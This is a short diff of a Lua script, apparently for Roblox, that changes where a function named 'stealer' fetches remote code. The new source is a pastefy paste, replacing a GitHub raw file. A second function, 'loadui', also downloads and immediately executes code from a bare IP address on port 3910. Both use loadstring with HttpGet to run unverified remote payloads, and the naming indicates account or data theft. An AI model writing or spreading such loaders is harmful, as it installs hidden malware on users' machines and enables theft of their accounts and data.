@@ -1,5 +1,5 @@
 local function stealer()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/FalcnHub/FalcnHub/refs/heads/main/asdasd"))()
+    loadstring(game:HttpGet("https://pastefy.app/HTwIHsBP/raw"))()
 end
 local function loadui()
   loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"))()
